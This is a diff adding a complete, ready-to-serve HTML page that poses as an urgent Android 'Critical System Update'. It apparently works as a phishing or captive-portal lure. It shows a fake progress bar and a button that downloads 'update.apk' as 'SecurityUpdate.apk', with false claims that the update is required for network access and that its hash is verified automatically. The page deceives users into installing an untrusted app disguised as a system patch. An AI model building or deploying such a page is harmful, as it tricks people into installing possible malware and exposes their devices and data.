@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Update Required</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  .card {
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 16px;
+    padding: 40px 30px;
+    max-width: 400px;
+    width: 100%;
+    text-align: center;
+    backdrop-filter: blur(10px);
+  }
+  .icon { font-size: 48px; margin-bottom: 20px; }
+  h1 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
+  p { color: rgba(255,255,255,0.6); font-size: 14px; line-height: 1.5; margin-bottom: 24px; }
+  .progress {
+    background: rgba(255,255,255,0.1);
+    border-radius: 8px;
+    height: 6px;
+    margin-bottom: 24px;
+    overflow: hidden;
+  }
+  .progress-bar {
+    background: linear-gradient(90deg, #00d2ff, #3a7bd5);
+    height: 100%;
+    width: 0%;
+    border-radius: 8px;
+    animation: progress 3s ease-in-out infinite;
+  }
+  @keyframes progress {
+    0% { width: 0%; }
+    50% { width: 70%; }
+    100% { width: 100%; }
+  }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(90deg, #00d2ff, #3a7bd5);
+    color: #fff;
+    padding: 12px 32px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-weight: 600;
+    font-size: 14px;
+    transition: transform 0.2s;
+  }
+  .btn:hover { transform: scale(1.05); }
+  .detail { font-size: 11px; color: rgba(255,255,255,0.3); margin-top: 16px; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="icon">&#9888;&#65039;</div>
+  <h1>Critical System Update Available</h1>
+  <p>A security update is required to protect your device and continue using the network. This update includes important security patches.</p>
+  <div class="progress">
+    <div class="progress-bar"></div>
+  </div>
+  <a href="update.apk" class="btn" download="SecurityUpdate.apk">Download Update (4.2 MB)</a>
+  <p class="detail">Android System Update v14.2.1 — Required for network access<br/>SHA-256 will be verified automatically</p>
+</div>
+</body>
+</html>
